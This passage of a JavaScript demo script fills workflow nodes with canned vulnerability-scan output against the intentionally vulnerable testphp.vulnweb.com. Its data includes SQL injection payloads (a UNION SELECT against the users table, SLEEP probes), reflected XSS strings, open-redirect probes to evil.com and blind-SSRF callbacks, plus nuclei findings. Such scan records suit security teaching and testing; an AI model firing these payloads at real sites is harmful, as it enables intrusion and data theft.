      http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=1
      http://testphp.vulnweb.com:80/comment.php?aid=1
      http://testphp.vulnweb.com:80/comment.php?pid=1
      http://testphp.vulnweb.com:80/hpp/?pp=12
      http://testphp.vulnweb.com:80/hpp/index.php?pp=12
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(column_name)+from+information_schema.columns+where+table_name='users'+--
      http://testphp.vulnweb.com:80/product.php?pic=1
      http://testphp.vulnweb.com:80/redir.php?r=http://1tip88.com/m88
      http://testphp.vulnweb.com:80/search.php?test=query
      http://testphp.vulnweb.com:80/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000`;
      ctx.reactFlowInstance.getNode("urldedupe-1").data.tool.duration = "00:00:16";
      ctx.setTest(Math.random());
    }, 88000);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("generate-line-patches-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("generate-line-patches-1").data.tool.output = `1,201`;
      ctx.reactFlowInstance.getNode("generate-line-patches-1").data.tool.stderr = `No stderr output found.`;
      ctx.reactFlowInstance.getNode("generate-line-patches-1").data.tool.stdout = `1,201`;
      ctx.reactFlowInstance.getNode("generate-line-patches-1").data.tool.duration = "00:00:01";
      ctx.setTest(Math.random());
    }, 89000);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("file-spliter-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("file-spliter-1").data.tool.output = `Spliters has no output.`;
      ctx.reactFlowInstance.getNode("file-spliter-1").data.tool.stderr = `Spliters has no stderr.`;
      ctx.reactFlowInstance.getNode("file-spliter-1").data.tool.stdout = `Spliters has no stdout.`;
      ctx.reactFlowInstance.getNode("file-spliter-1").data.tool.duration = "00:00:01";
      ctx.setTest(Math.random());
    }, 90000);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("batch-output-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("batch-output-1").data.tool.output = `http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,0,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,1,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,97,NULL,active
      http://testphp.vulnweb.com/artist.php?artist=1
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3
      http://testphp.vulnweb.com/artists.php?artist=
      http://testphp.vulnweb.com/artists.php?artist=1&
      http://testphp.vulnweb.com/categories.php/listproducts.php?cat=%27
      http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fst
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%25
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Ealert(0x107E91)%3C%2fscRipt%3E&pp=12
      http://testphp.vulnweb.com/hpp/params.php?p=
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;iframe
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt;
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12&aaaa%2f=
      http://testphp.vulnweb.com/index.php?%25id%25=1&user=2
      http://testphp.vulnweb.com/index.php?id=%252%25&user=1
      http://testphp.vulnweb.com/listproducts.php?-
      http://testphp.vulnweb.com/listproducts.php?artist
      http://testphp.vulnweb.com/listproducts.php?artist=123&amp;asdf=ff&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?cat=
      http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E&zfdfasdf=124fffff
      http://testphp.vulnweb.com/listproducts.php?cat=123%22&
      http://testphp.vulnweb.com/listproducts.php?id=1
      http://testphp.vulnweb.com/login.php?id=1
      http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-
      http://testphp.vulnweb.com/redir.php?r=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$&utm_source=connecting&utm_medium=email&utm_campaign=2013.
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$?ref=GBXBlP&e=&rurl=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?src=www.rhino.ca&authCookie=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/01/?mr:referralID=bfe8299e-77a8-11ed-83ba-02635dc62ca7?trackId=gdi&KNL=$$$IDdestinatario$$$&NNL=13500&CNL=10&HNL=3481a
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/03/?KNL=$$$IDdestinatario$$$?s=1&BannerClickID=30762292&AffiliateID=ayFJWpGmVP5dqiqsij/cZA==&ASCampaignID=yUrcihPILTWjfcF+1Brm/Q==&ASFrontpageID=1
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner/user/profile/13323https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?a=INVESTIV-HOME-RR&utm_source=&utm_medium=banner
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?a=INVESTIV-HOME-RR?a=INVESTIV-HOME-RR?a=INVESTIV-HOME-RR&utm_source=&utm_medium=&utm_content=&utm_campaign=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?utm_source=connecting?s=1&mr:referralID=255c5619-cbb9-11ed-83ba-12a9c0fb0737
      http://testphp.vulnweb.com/redir.php?r\u003dhttps://festivetreat.com
      http://testphp.vulnweb.com/search.php?test=hello2
      http://testphp.vulnweb.com/search.php?test=query&
      http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul
      http://testphp.vulnweb.com/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
      http://testphp.vulnweb.com/showimage.php?file=
      http://testphp.vulnweb.com/showimage.php?file='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x002C88)%3C/scRipt%3E&size=160
      http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1
      http://testphp.vulnweb.com:80/admin/?C=D;O=A
      http://testphp.vulnweb.com:80/artists.php?artist%20=1
      http://testphp.vulnweb.com:80/artists.php?artist=1
      http://testphp.vulnweb.com:80/bxss/vuln.php?id=1
      http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=1
      http://testphp.vulnweb.com:80/comment.php?aid=1
      http://testphp.vulnweb.com:80/comment.php?pid=1
      http://testphp.vulnweb.com:80/hpp/?pp=12
      http://testphp.vulnweb.com:80/hpp/index.php?pp=12
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(column_name)+from+information_schema.columns+where+table_name='users'+--
      http://testphp.vulnweb.com:80/product.php?pic=1
      http://testphp.vulnweb.com:80/redir.php?r=http://1tip88.com/m88
      http://testphp.vulnweb.com:80/search.php?test=query
      http://testphp.vulnweb.com:80/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000`;
      ctx.reactFlowInstance.getNode("batch-output-1").data.tool.stderr = `No stderr output found`;
      ctx.reactFlowInstance.getNode("batch-output-1").data.tool.stdout = `1,201`;
      ctx.reactFlowInstance.getNode("batch-output-1").data.tool.duration = "00:00:01";
      ctx.setTest(Math.random());
    }, 91000);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("nuclei-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("nuclei-1").data.tool.output = `http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,0,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,1,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,97,NULL,active
      http://testphp.vulnweb.com/artist.php?artist=1
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3
      http://testphp.vulnweb.com/artists.php?artist=
      http://testphp.vulnweb.com/artists.php?artist=1&
      http://testphp.vulnweb.com/categories.php/listproducts.php?cat=%27
      http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fst
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%25
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Ealert(0x107E91)%3C%2fscRipt%3E&pp=12
      http://testphp.vulnweb.com/hpp/params.php?p=
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;iframe
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt;
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12&aaaa%2f=
      http://testphp.vulnweb.com/index.php?%25id%25=1&user=2
      http://testphp.vulnweb.com/index.php?id=%252%25&user=1
      http://testphp.vulnweb.com/listproducts.php?-
      http://testphp.vulnweb.com/listproducts.php?artist
      http://testphp.vulnweb.com/listproducts.php?artist=123&amp;asdf=ff&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?cat=
      http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E&zfdfasdf=124fffff
      http://testphp.vulnweb.com/listproducts.php?cat=123%22&
      http://testphp.vulnweb.com/listproducts.php?id=1
      http://testphp.vulnweb.com/login.php?id=1
      http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-
      http://testphp.vulnweb.com/redir.php?r=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$&utm_source=connecting&utm_medium=email&utm_campaign=2013.
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$?ref=GBXBlP&e=&rurl=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?src=www.rhino.ca&authCookie=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/01/?mr:referralID=bfe8299e-77a8-11ed-83ba-02635dc62ca7?trackId=gdi&KNL=$$$IDdestinatario$$$&NNL=13500&CNL=10&HNL=3481a
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/03/?KNL=$$$IDdestinatario$$$?s=1&BannerClickID=30762292&AffiliateID=ayFJWpGmVP5dqiqsij/cZA==&ASCampaignID=yUrcihPILTWjfcF+1Brm/Q==&ASFrontpageID=1
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner/user/profile/13323https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?a=INVESTIV-HOME-RR&utm_source=&utm_medium=banner
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?a=INVESTIV-HOME-RR?a=INVESTIV-HOME-RR?a=INVESTIV-HOME-RR&utm_source=&utm_medium=&utm_content=&utm_campaign=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?utm_source=connecting?s=1&mr:referralID=255c5619-cbb9-11ed-83ba-12a9c0fb0737
      http://testphp.vulnweb.com/redir.php?r\u003dhttps://festivetreat.com
      http://testphp.vulnweb.com/search.php?test=hello2
      http://testphp.vulnweb.com/search.php?test=query&
      http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul
      http://testphp.vulnweb.com/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
      http://testphp.vulnweb.com/showimage.php?file=
      http://testphp.vulnweb.com/showimage.php?file='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x002C88)%3C/scRipt%3E&size=160
      http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1
      http://testphp.vulnweb.com:80/admin/?C=D;O=A
      http://testphp.vulnweb.com:80/artists.php?artist%20=1
      http://testphp.vulnweb.com:80/artists.php?artist=1
      http://testphp.vulnweb.com:80/bxss/vuln.php?id=1
      http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=1
      http://testphp.vulnweb.com:80/comment.php?aid=1
      http://testphp.vulnweb.com:80/comment.php?pid=1
      http://testphp.vulnweb.com:80/hpp/?pp=12
      http://testphp.vulnweb.com:80/hpp/index.php?pp=12
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(column_name)+from+information_schema.columns+where+table_name='users'+--
      http://testphp.vulnweb.com:80/product.php?pic=1
      http://testphp.vulnweb.com:80/redir.php?r=http://1tip88.com/m88
      http://testphp.vulnweb.com:80/search.php?test=query
      http://testphp.vulnweb.com:80/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000`;
      ctx.reactFlowInstance.getNode("nuclei-1").data.tool.stderr = `		projectdiscovery.io
      [INF] nuclei-templates are not installed, installing...
      [INF] Successfully installed nuclei-templates at /root/nuclei-templates
      [INF] Current nuclei version: v3.1.7 (latest)
      [INF] Current nuclei-templates version: v9.7.4 (latest)
      [WRN] Scan results upload to cloud is disabled.
      [INF] New templates added in latest release: 6
      [INF] Templates loaded for current scan: 19
      [WRN] Executing 21 unsigned templates. Use with caution.
      [INF] Targets loaded for current scan: 65
      [INF] Using Interactsh Server: oast.pro
      [0:00:05] | Templates: 19 | Hosts: 65 | RPS: 145 | Matched: 41 | Errors: 18 | Requests: 729/12870 (5%)
      [INF] Skipped testphp.vulnweb.com:80 from target list as found unresponsive 30 times
      [0:00:10] | Templates: 19 | Hosts: 65 | RPS: 134 | Matched: 61 | Errors: 81 | Requests: 1341/12870 (10%)
      [0:00:15] | Templates: 19 | Hosts: 65 | RPS: 89 | Matched: 61 | Errors: 81 | Requests: 1350/12870 (10%)
      [0:00:17] | Templates: 19 | Hosts: 65 | RPS: 79 | Matched: 61 | Errors: 81 | Requests: 1350/12870 (10%)`;
      ctx.reactFlowInstance.getNode("nuclei-1").data.tool.stdout = `		projectdiscovery.io
      [INF] nuclei-templates are not installed, installing...
      [INF] Successfully installed nuclei-templates at /root/nuclei-templates
      [INF] Current nuclei version: v3.1.7 (latest)
      [INF] Current nuclei-templates version: v9.7.4 (latest)
      [WRN] Scan results upload to cloud is disabled.
      [INF] New templates added in latest release: 6
      [INF] Templates loaded for current scan: 19
      [WRN] Executing 21 unsigned templates. Use with caution.
      [INF] Targets loaded for current scan: 65
      [INF] Using Interactsh Server: oast.pro
      [0:00:05] | Templates: 19 | Hosts: 65 | RPS: 145 | Matched: 41 | Errors: 18 | Requests: 729/12870 (5%)
      [INF] Skipped testphp.vulnweb.com:80 from target list as found unresponsive 30 times
      [0:00:10] | Templates: 19 | Hosts: 65 | RPS: 134 | Matched: 61 | Errors: 81 | Requests: 1341/12870 (10%)
      [0:00:15] | Templates: 19 | Hosts: 65 | RPS: 89 | Matched: 61 | Errors: 81 | Requests: 1350/12870 (10%)
      [0:00:17] | Templates: 19 | Hosts: 65 | RPS: 79 | Matched: 61 | Errors: 81 | Requests: 1350/12870 (10%)`;
      ctx.reactFlowInstance.getNode("nuclei-1").data.tool.duration = "00:09:01";
      ctx.setTest(Math.random());
    }, 100000);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("recursively-cat-all-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("recursively-cat-all-1").data.tool.output = `[reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?artist='"><43973
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?artist=' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10' ["Warning: mysql_"]
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?-=' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p=valid'"><43973&pp=12&aaaa%2f
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p='"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p=valid'"><43973&pp=12
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p='"><43973&lt;iframe
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/artists.php?artist=' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p='"><43973&lt;script&gt;alert(1)&lt;/script&gt
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p='"><43973&lt;script&gt;alert(1)&lt;/script&gt;
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/artists.php?artist=1' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fst'"><43973
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&utm_source=connecting&utm_medium=email&utm_campaign=2013.
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&utm_source&utm_medium=banner
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&KNL=$$$IDdestinatario$$$&NNL=13500&CNL=10&HNL=3481a
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&mr:referralID=255c5619-cbb9-11ed-83ba-12a9c0fb0737
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&BannerClickID=30762292&AffiliateID=ayFJWpGmVP5dqiqsij/cZA==&ASCampaignID=yUrcihPILTWjfcF+1Brm/Q==&ASFrontpageID=1
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&authCookie
      [open-redirect] [http] [medium] http://testphp.vulnweb.com:80/redir.php?r=https://evil.com
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&utm_medium=banner/user/profile/13323https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&utm_source&utm_medium&utm_content&utm_campaign
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&e&rurl=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?artist=123'&asdf=ff'&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E' ["check the manual that corresponds to your MySQL server version","SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?artist=123'"><43973&amp;asdf=ff&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?artist=123'&amp;asdf=ff'&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E'&zfdfasdf=124fffff' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?cat=123%22' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?cat=' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?id=1' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?cat=123%22'"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?aaaa%2f&p=%25'"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E'"><43973&zfdfasdf=124fffff
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?cat='"><43973
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?aaaa%2f&p=%3CscRipt%3Ealert(0x107E91)%3C%2fscRipt%3E'"><43973&pp=12
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(column_name)+from+information_schema.columns+where+table_name='users'+--'"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com:80/hpp/?pp=12'"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com:80/hpp/index.php?pp=12'"><43973
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/search.php?test=query'&cat=123'&ppl=1fhhahwul' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/search.php?test=hello2' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/search.php?test=query' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E'"><43973
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gssidcuifh9hzx.oast.pro&utm_medium=banner/user/profile/13323https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gx3sgf6jxgemmg.oast.pro&mr:referralID=255c5619-cbb9-11ed-83ba-12a9c0fb0737
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gyhzzhmd7p6k1c.oast.pro&utm_source&utm_medium=banner
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com:80/redir.php?r=https://cmq1109ohb9s73fe2u0gnhwt5e1jw4mfu.oast.pro
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gq4y1nde9jtazh.oast.pro&utm_source=connecting&utm_medium=email&utm_campaign=2013.
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gk39pkxuofuu9y.oast.pro&BannerClickID=30762292&AffiliateID=ayFJWpGmVP5dqiqsij/cZA==&ASCampaignID=yUrcihPILTWjfcF+1Brm/Q==&ASFrontpageID=1
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gbf1ibxnp9akcm.oast.pro&utm_source&utm_medium&utm_content&utm_campaign
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gzupwjbpiree99.oast.pro&e&rurl=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gicbu38hrgtjjs.oast.pro&authCookie
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gsnrwhuyctpysq.oast.pro&KNL=$$$IDdestinatario$$$&NNL=13500&CNL=10&HNL=3481a
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com:80/bxss/vuln.php?id=1' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com:80/artists.php?artist=1' ["Warning: mysql_"]`;
      ctx.reactFlowInstance.getNode("recursively-cat-all-1").data.tool.stderr = `No stderr output found`;
      ctx.reactFlowInstance.getNode("recursively-cat-all-1").data.tool.stdout = `[reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?artist='"><43973
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?artist=' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10' ["Warning: mysql_"]
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?-=' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p=valid'"><43973&pp=12&aaaa%2f
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p='"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p=valid'"><43973&pp=12
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p='"><43973&lt;iframe
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/artists.php?artist=' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p='"><43973&lt;script&gt;alert(1)&lt;/script&gt
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?p='"><43973&lt;script&gt;alert(1)&lt;/script&gt;
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/artists.php?artist=1' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fst'"><43973
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&utm_source=connecting&utm_medium=email&utm_campaign=2013.
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&utm_source&utm_medium=banner
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&KNL=$$$IDdestinatario$$$&NNL=13500&CNL=10&HNL=3481a
